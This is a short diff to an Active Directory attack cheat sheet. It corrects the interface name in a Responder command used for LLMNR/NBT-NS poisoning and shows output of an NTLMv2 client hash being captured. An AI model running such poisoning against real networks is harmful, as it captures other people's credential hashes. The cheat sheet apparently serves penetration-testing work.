@@ -3,7 +3,7 @@ Active Directory Cheat Sheet
 
 #### LLMNR/NBT-NS poisoning 
 
-`responder -I eht0 -rdw`
+`responder -I eth0 -rdw`
 ```
 [+] Listening for events...
 [SMB] NTLMv2-SSP Client   : 192.168.22.137
